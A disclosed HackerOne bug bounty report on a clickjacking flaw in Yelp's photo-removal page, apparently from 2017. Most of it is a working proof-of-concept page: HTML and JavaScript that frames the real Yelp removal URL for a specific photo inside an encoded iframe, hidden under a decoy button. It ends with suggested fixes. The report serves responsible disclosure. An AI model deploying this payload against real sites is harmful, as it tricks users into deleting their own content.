# Click jacking in delete image of user in Yelp

## Report Details
- **Report ID**: 201848
- **URL**: https://hackerone.com/reports/201848
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-28T23:00:52.575Z
- **Disclosed**: 2017-11-09T20:27:02.906Z

## Reporter
- **Username**: mohamedsherif
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
Hello,
# Problem 
I found that https://www.yelp.com/user_photos/{photo_id}/remove is vulnerable to click-jacking because of missing X-Frame-Options on this page which allows an attacker to send the victim the POC ( sent with the report ) to the user to remove his profile picture 
# POC
```
<div id="container" style="clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%">
<input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
<div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 64px; height: 30px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
<!-- Show this element when clickjacking is complete -->
<div id="clickjack_complete" style="display:none;-webkit-transform-style: preserve-3d;-moz-transform-style: preserve-3d;transform-style: preserve-3d;font-family:Arial;font-size:16pt;color:red;text-align:center;width:100%;height:100%;"><div style="position:relative;top: 50%;transform: translateY(-50%);">You've been clickjacked!</div></div>
<iframe id="parentFrame" src="data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwczovL3d3dy55ZWxwLmNvbS91c2VyX3Bob3Rvcy9idlBiOUVzWXhRb1RfWENGMzYzSEpRL3JlbW92ZSIgc2Nyb2xsaW5nPSJubyIgc3R5bGU9IndpZHRoOjEzNDlweDtoZWlnaHQ6NzY1cHg7cG9zaXRpb246YWJzb2x1dGU7bGVmdDo1cHg7dG9wOi0xMDdweDtib3JkZXI6MDsiIGZyYW1lYm9yZGVyPSIwIiBpZD0iY2hpbGRGcmFtZSIgb25sb2FkPSJwYXJlbnQucG9zdE1lc3NhZ2UoSlNPTi5zdHJpbmdpZnkoe2NsaWNrYmFuZGl0OjF9KSwnKicpIj48L2lmcmFtZT4=" scrolling="no" style="transform: scale(1); transform-origin: 200px 200px 0px; opacity: 0.5; border: 0px none; position: absolute; z-index: 1; width: 1349px; height: 896px; left: 0px; top: 0px;" frameborder="0"></iframe>
</div>
<script>function findPos(obj) {
	    var left = 0, top = 0;
	    if(obj.offsetParent) {
	        while(1) {
	          left += obj.offsetLeft;
	          top += obj.offsetTop;
	          if(!obj.offsetParent) {
	            break;
	          }
	          obj = obj.offsetParent;
	        }
	    } else if(obj.x && obj.y) {
	        left += obj.x;
	        top += obj.y;
	    }
	    return [left,top];
  	}function generateClickArea(pos) {
			var elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight, 
				btn = document.getElementById('clickjack_button');
			if(pos < window.clickbandit.config.clickTracking.length) {
				clickjackCompleted(false);
				elementWidth = window.clickbandit.config.clickTracking[pos].width;
				elementHeight = window.clickbandit.config.clickTracking[pos].height;
				btn.style.width = elementWidth + 'px';
				btn.style.height = elementHeight + 'px';
				window.clickbandit.elementWidth = elementWidth;
				window.clickbandit.elementHeight = elementHeight;
				x = window.clickbandit.config.clickTracking[pos].left;
				y = window.clickbandit.config.clickTracking[pos].top;
				docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;
				docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;
				parentOffsetWidth = desiredX - x;
				parentOffsetHeight = desiredY - y;
				parentFrame.style.width = docWidth+'px';
				parentFrame.style.height = docHeight+'px';
				parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');
				calculateButtonSize(getFactor(parentFrame));
				showButton();
				if(parentFrame.style.opacity === '0') {
					calculateClip();
				}
			} else {
				resetClip();
				hideButton();
				clickjackCompleted(true);
			}
		}function hideButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 0;
		}function showButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 1;
		}function clickjackCompleted(show) {
			var complete = document.getElementById('clickjack_complete');
			if(show) {
				complete.style.display = 'block';
			} else {
				complete.style.display = 'none';
			}
		}window.addEventListener("message", function handleMessages(e){
			var data;
			try { 
				data = JSON.parse(e.data);
			} catch(e){ 
				data = {}; 
			}
			if(!data.clickbandit) { 
				return false; 
			} 
			showButton(); 
		},false);window.addEventListener("blur", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById("clickjack_focus").focus();},1000); } }, false);document.getElementById("parentFrame").addEventListener("mouseover",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById("parentFrame").addEventListener("mouseout",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: "review", mouseover:false,elementWidth:64,elementHeight:30,config:{"clickTracking":[{"width":64,"height":30,"mouseX":239,"mouseY":333,"left":195,"top":307,"documentWidth":1349,"documentHeight":896}],"currentPosition":0}};function calculateClip() {
			var btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;
			container.style.overflow = 'hidden';
			container.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';
			container.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';
		}function calculateButtonSize(factor) {
			var btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);
			btn.style.width = resizedWidth + 'px';
			btn.style.height = resizedHeight + 'px';
			if(factor > 100) {
				btn.style.fontSize = '400%';
			} else {
				btn.style.fontSize = (factor * 100) + '%';
			}
		}function resetClip() {
			var container = document.getElementById('container');
			container.style.overflow = 'visible';
			container.style.clip = 'auto';
			container.style.clipPath = 'none';
		}function getFactor(obj) {
			if(typeof obj.style.transform === 'string') {
				return obj.style.transform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.msTransform === 'string') {
				return obj.style.msTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.MozTransform === 'string') {
				return obj.style.MozTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.oTransform === 'string') {
				return obj.style.oTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.webkitTransform === 'string') {
				return obj.style.webkitTransform.replace(/[^\d.]/g,'');
			}
			return 1;
		}</script>
```
# Solution 
Adding X-FRAME-OPTIONS header with value DENY or ( and ) asking for user password when deleting photos

Thanks, 
Mohamed

## Attachments
- clickjacked.html
- screenshot.png
